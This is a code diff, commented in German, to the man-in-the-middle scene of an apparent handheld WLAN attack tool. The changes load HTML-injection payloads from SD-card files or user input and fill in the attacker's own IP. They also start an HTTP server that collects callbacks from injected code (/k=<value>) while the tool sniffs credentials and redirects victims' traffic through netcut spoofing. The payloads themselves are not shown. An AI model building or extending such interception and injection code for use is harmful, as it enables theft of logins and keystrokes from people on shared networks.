@@ -2,6 +2,9 @@
 #include "../wlan_netcut.h"
 #include "../wlan_cred_sniff.h"
 #include "../wlan_html_inject.h"
+#include "../wlan_mitm_server.h"
+#include "../wlan_mitm_payloads.h"
+#include "../wlan_hal.h"
 
 // Run-Scene des MiTM-Features (vormals "Live Creds"). Settings (Inject ein/aus,
 // Inject-Code, Store-Cred) kommen aus app->mitm_*, gesetzt in scene_mitm_menu.
@@ -195,6 +198,7 @@ static bool lc_disarm_and_restore(WlanApp* app) {
     lc_close_csv();
     wlan_cred_sniff_set_armed(app->cred_sniff, false);
     wlan_html_inject_set_armed(false);
+    wlan_mitm_server_stop();
     lc_disarm_monitor(app);
     bool restore_triggered =
         wlan_netcut_apply(app->netcut, app->devices, (uint8_t)app->device_count);
@@ -228,11 +232,27 @@ void wlan_app_scene_live_creds_on_enter(void* context) {
 
     wlan_cred_sniff_set_armed(app->cred_sniff, true);
     if(app->mitm_inject_enabled) {
+        // %%MY_IP%% im Template auflösen können — eigene STA-IP übergeben.
+        wlan_html_inject_set_my_ip(wlan_hal_get_own_ip());
+        // Payload-Auswahl: bei "custom" (oder kaputtem Index) den vom User
+        // eingetippten mitm_inject_code nehmen, sonst die SD-Datei laden. Wir
+        // schreiben in mitm_inject_code zurück, damit beim Re-Enter der
+        // Inject-Code-Scene der zuletzt verwendete Payload sichtbar ist.
+        if(app->mitm_payload_index < app->mitm_payloads.count) {
+            const char* name = app->mitm_payloads.items[app->mitm_payload_index].name;
+            char buf[sizeof(app->mitm_inject_code)];
+            if(wlan_mitm_payloads_load(name, buf, sizeof(buf))) {
+                memcpy(app->mitm_inject_code, buf, sizeof(buf));
+                app->mitm_inject_code[sizeof(app->mitm_inject_code) - 1] = '\0';
+            }
+        }
         wlan_html_inject_set_code(app->mitm_inject_code);
         wlan_html_inject_set_armed(true);
     } else {
         wlan_html_inject_set_armed(false);
     }
+    // HTTP-Server für eingehende Inject-Callbacks (/k=<value> → [LOG]).
+    wlan_mitm_server_start(app->cred_sniff);
     wlan_netcut_apply(app->netcut, app->devices, (uint8_t)app->device_count);
 
     wlan_live_creds_view_reset(app->live_creds_view_obj);
